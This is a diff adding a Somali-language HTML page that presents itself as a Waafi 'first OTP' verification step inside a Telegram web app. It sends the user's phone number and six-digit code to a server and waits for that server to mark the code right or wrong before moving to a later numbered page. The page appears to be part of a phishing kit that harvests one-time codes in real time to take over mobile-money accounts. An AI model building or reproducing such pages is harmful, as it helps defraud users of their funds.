@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waafi - OTP Kowaad</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f7f7f7; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .card { 
+            background: white; 
+            width: 90%; 
+            max-width: 400px; 
+            margin-top: 50px; 
+            padding: 40px 20px; 
+            border-radius: 20px; 
+            text-align: center; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
+            box-sizing: border-box;
+        }
+
+        h2 { font-size: 24px; color: #222; margin-bottom: 15px; font-weight: 700; }
+        .instruction { color: #666; font-size: 15px; margin-bottom: 25px; }
+
+        .otp-group { 
+            display: flex; 
+            justify-content: center; 
+            gap: 8px; 
+            margin-bottom: 20px; 
+        }
+
+        .otp-input { 
+            width: 42px; 
+            height: 55px; 
+            border: 1.5px solid #82d13d; 
+            border-radius: 10px; 
+            text-align: center; 
+            font-size: 22px; 
+            font-weight: bold; 
+            outline: none; 
+        }
+
+        .resend-text { color: #999; font-size: 14px; margin-bottom: 20px; }
+
+        .btn-verify { 
+            background-color: #e0e0e0; 
+            color: #999; 
+            border: none; 
+            width: 100%; 
+            padding: 18px; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: not-allowed;
+        }
+
+        .btn-verify.active { 
+            background-color: #82d13d; 
+            color: white; 
+            cursor: pointer; 
+        }
+
+        #loadingSection { display: none; }
+
+        .footer-wave { 
+            width: 100%; 
+            background: linear-gradient(to bottom, #82d13d, #a3e635); 
+            padding: 60px 0;
+            margin-top: auto; 
+            text-align: center; 
+            color: white;
+        }
+
+        #errorBox {
+            color: red;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card" id="inputSection">
+    <h2>Xaqiijinta OTP-ga Kowaad</h2>
+    <p class="instruction">Geli OTP-ga kowaad</p>
+
+    <div id="errorBox"></div>
+
+    <div class="otp-group">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+    </div>
+
+    <p class="resend-text">Koodka mar kale u dir <span id="timer">60</span>s</p>
+
+    <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
+        XAQIIJI OTP
+    </button>
+</div>
+
+<div class="card" id="loadingSection">
+    <p>Fadlan sug...</p>
+</div>
+
+<div class="footer-wave">
+    <p>© 2026 Waafi Soomaaliya</p>
+</div>
+
+<script>
+const inputs = document.querySelectorAll('.otp-input');
+const verifyBtn = document.getElementById('verifyBtn');
+const inputSection = document.getElementById('inputSection');
+const loadingSection = document.getElementById('loadingSection');
+const timerText = document.getElementById('timer');
+const errorBox = document.getElementById('errorBox');
+
+let isSubmitting = false;
+
+window.onload = () => {
+    window.Telegram?.WebApp?.ready();
+    window.Telegram?.WebApp?.expand();
+
+    const phone = localStorage.getItem('phone');
+    if (!phone) {
+        errorBox.innerText = "Fadhigu wuu dhacay. Fadlan dib u gal.";
+        setTimeout(() => window.location.href = "/index.html", 1500);
+    }
+
+    startCountdown();
+};
+
+function startCountdown() {
+    let count = 60;
+    const interval = setInterval(() => {
+        timerText.innerText = count;
+        count--;
+        if (count < 0) clearInterval(interval);
+    }, 1000);
+}
+
+inputs.forEach((input, i) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
+        check();
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && !input.value && i > 0) {
+            inputs[i - 1].focus();
+        }
+    });
+});
+
+function check() {
+    const filled = [...inputs].every(i => i.value.length === 1);
+    verifyBtn.disabled = !filled;
+    verifyBtn.classList.toggle('active', filled);
+}
+
+async function handleVerification() {
+    if (isSubmitting) return;
+
+    const phone = localStorage.getItem('phone');
+    if (!phone) return;
+
+    let otp = "";
+    inputs.forEach(i => otp += i.value);
+
+    isSubmitting = true;
+
+    inputSection.style.display = "none";
+    loadingSection.style.display = "block";
+    errorBox.innerText = "";
+
+    try {
+        await fetch('/api/verify-first-otp', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone, otp })
+        });
+
+        const poll = setInterval(async () => {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
+
+            if (data.status === "otp1_correct") {
+                clearInterval(poll);
+                localStorage.setItem("phone", phone);
+                window.location.href = "/page9";
+            }
+
+            if (data.status === "otp1_wrong") {
+                clearInterval(poll);
+
+                // ✅ FIXED SOMALI MESSAGE
+                errorBox.innerText = "❌ Koodhka waa khalad, fadlan dib u geli koodhka saxda ah";
+
+                reset();
+            }
+
+        }, 2000);
+
+    } catch (err) {
+        console.error(err);
+        reset();
+    }
+}
+
+function reset() {
+    isSubmitting = false;
+    loadingSection.style.display = "none";
+    inputSection.style.display = "block";
+    inputs.forEach(i => i.value = "");
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove('active');
+}
+</script>
+
+</body>
+</html>
